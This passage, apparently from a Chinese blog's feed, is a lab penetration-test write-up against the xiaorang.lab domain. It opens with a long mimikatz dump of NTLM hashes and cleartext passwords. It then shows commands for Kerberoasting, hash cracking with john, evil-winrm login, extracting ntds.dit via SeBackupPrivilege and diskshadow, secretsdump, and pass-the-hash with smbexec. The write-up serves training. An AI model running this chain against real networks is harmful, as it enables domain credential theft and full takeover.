f6ff2714d556240436758527e190e329f05cd43d</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 3150084 (00000000:00301104)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : zhangshuai</span><br><span class="line">Domain            : XR-0923</span><br><span class="line">Logon Server      : XR-0923</span><br><span class="line">Logon Time        : 2025/3/10 19:13:09</span><br><span class="line">SID               : S-1-5-21-754105099-1176710061-2177073800-1001</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a</span><br><span class="line">         * SHA1     : f6ff2714d556240436758527e190e329f05cd43d</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : zhangshuai</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : wSbEajHzZs</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 3108560 (00000000:002f6ed0)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : UMFD-2</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 19:13:08</span><br><span class="line">SID               : S-1-5-96-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 64330 (00000000:0000fb4a)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:24</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : 8519c5a89b2cd4d679a5a36f26863e5d</span><br><span class="line">         * SHA1     : 42d8188bc30ff0880b838e368c6e5522b86f978d</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : &amp;H!vqg]om0Iz5Pn1NUGod&amp;R9o /!$EK.?jn06+[J*6oZ\A+H?c2;V\(AgGpKw*f0W\vdUf;QoJ/5#DRZDwR@W5U9Io8`;zE7L&quot;:Ay-SKpe#&gt;5S?;IL&#x27;HarDD</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 64312 (00000000:0000fb38)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:24</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : XR-0923$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:23</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : xr-0923$</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 32395 (00000000:00007e8b)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:23</span><br><span class="line">SID               :</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5985359 (00000000:005b544f)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : ocean</span><br><span class="line">Domain            : XR-0923</span><br><span class="line">Logon Server      : XR-0923</span><br><span class="line">Logon Time        : 2025/3/10 19:32:27</span><br><span class="line">SID               : S-1-5-21-754105099-1176710061-2177073800-1002</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ocean</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * NTLM     : 579da618cfbfa85247acf1f800a280a4</span><br><span class="line">         * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : ocean</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : ocean</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 5985329 (00000000:005b5431)</span><br><span class="line">Session           : RemoteInteractive from 3</span><br><span class="line">User Name         : ocean</span><br><span class="line">Domain            : XR-0923</span><br><span class="line">Logon Server      : XR-0923</span><br><span class="line">Logon Time        : 2025/3/10 19:32:27</span><br><span class="line">SID               : S-1-5-21-754105099-1176710061-2177073800-1002</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ocean</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * NTLM     : 579da618cfbfa85247acf1f800a280a4</span><br><span class="line">         * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : ocean</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : ocean</span><br><span class="line">         * Domain   : XR-0923</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 3109913 (00000000:002f7419)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 19:13:08</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 3109437 (00000000:002f723d)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 19:13:08</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 995 (00000000:000003e3)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : IUSR</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:26</span><br><span class="line">SID               : S-1-5-17</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:24</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : (null)</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 33498 (00000000:000082da)</span><br><span class="line">Session           : Interactive from 0</span><br><span class="line">User Name         : UMFD-0</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:23</span><br><span class="line">SID               : S-1-5-96-0-0</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 33470 (00000000:000082be)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : UMFD-1</span><br><span class="line">Domain            : Font Driver Host</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:23</span><br><span class="line">SID               : S-1-5-96-0-1</span><br><span class="line">        msv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * NTLM     : a4f432e39e79dc4ad8b85854ed243f61</span><br><span class="line">         * SHA1     : 2718b31174dc5fe2ae10f2aeecb08af8fbf4fd1f</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : xiaorang.lab</span><br><span class="line">         * Password : 18 77 1d d8 f8 70 90 6d df 7b 30 47 4d 9d b7 7d 8e 84 8a 85 57 e9 68 44 69 f5 01 a2 27 f6 d2 05 95 83 45 86 54 82 7d 6c 17 58 0b 38 04 af ff a6 ff ec 01 87 77 22 7c f6 bf 43 72 88 14 5b c5 9c dd 34 62 5c dd 7b c5 82 9c 10 16 9b 25 fa d6 cb d3 2d 9f 8b f3 f4 9d 8f 3b 64 2f b8 b1 44 5b f5 b0 87 2d bc e0 11 50 c3 23 12 75 f6 32 7b a7 8e ce b7 3d 89 b1 56 12 c5 7e cc 60 98 5d c7 7d 4d 45 6e fd c3 65 41 ba 8a fe 7e fb f8 79 ca 60 f7 4e be bc 62 04 71 47 15 ea 19 f0 ad 00 f7 39 7a b1 01 f6 bf e6 c1 33 a8 bf 0b 7d 4c 0f 54 cb 0b 40 28 6e 3d 3e d9 19 8e 44 4e 2e 62 28 76 78 d2 d3 57 ec 9f 12 d7 bc 51 56 88 ed 67 99 4f 09 01 49 b3 e0 02 33 6e 26 31 c3 53 a7 bd 79 20 2e 17 ed 11 c4 d7 a5 fc 31 0c 72 75 aa 8f 39 12 fd 7e</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : XR-0923$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/10 18:43:23</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">        msv :</span><br><span class="line">        tspkg :</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : XR-0923$</span><br><span class="line">         * Domain   : XIAORANG</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : xr-0923$</span><br><span class="line">         * Domain   : XIAORANG.LAB</span><br><span class="line">         * Password : (null)</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line">        cloudap :</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到flag</p><img src="/post/d42c659b/IMAGE20250310193139584.png" class=""><p>拿着这个机器的用户的hash去查看下spn</p><img src="/post/d42c659b/IMAGE20250310194106196.png" class=""><p>发现tianjing</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py xiaorang.lab/&#x27;XR-0923$&#x27; -hashes &#x27;:a4f432e39e79dc4ad8b85854ed243f61&#x27; -dc-ip 172.22.14.11 -request-user tianjing</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310194128513.png" class=""><p>用john爆破下hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310194233547.png" class=""><p>去登录一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2  </span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310194400555.png" class=""><p>发现SeBackupPrivilege权限</p><h3 id="SeBackupPrivilege-拷贝-sam">SeBackupPrivilege 拷贝 sam</h3><p>首先在本地创建一个raj.r2dsh文件，这里命名为raj.dsh，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias raj</span><br><span class="line">create</span><br><span class="line">expose %raj% z:</span><br></pre></td></tr></table></figure><p>接下来再用unix2dos将dsh文件的编码间距转换为Windows兼容的编码和间距</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix2dos raj.dsh</span><br></pre></td></tr></table></figure><p>我们在C:/下创建一个test文件夹进去将raj.dsh拷贝进来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir test </span><br><span class="line">cd test</span><br><span class="line">upload raj.dsh</span><br></pre></td></tr></table></figure><p>最后 卷影拷贝</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diskshadow /s raj.dsh</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310195015341.png" class=""><p>然后复制到当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RoboCopy /b z:\windows\ntds . ntds.dit</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310195150382.png" class=""><p>然后备份注册表，再下载到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system system</span><br><span class="line">download system</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310195320521.png" class=""><p>然后用impacket-secretsdump解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -ntds ntds.dit -system system local</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310200009155.png" class=""><p>拿到域管的hash打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 smbexec.py -hashes :70c39b547b7d8adec35ad7c09fb1d277 Administrator@172.22.14.11 </span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310200240284.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;先看扫描记录&lt;/p&gt;
&lt;img src=&quot;/post/d42c659b/IMAGE20250310171306818.png&quot; class=&quot;&quot;&gt;
&lt;p&gt;没啥东西就俩web，联想提示，咱们去扫描下目录。&lt;/p&gt;
&lt;img sr</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>Exchange-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/e42dd187.html"/>
    <id>https://oceanzbz.github.io/post/e42dd187.html</id>
    <published>2025-03-09T13:23:59.000Z</published>
    <updated>2025-03-10T12:26:34.970Z</updated>
    
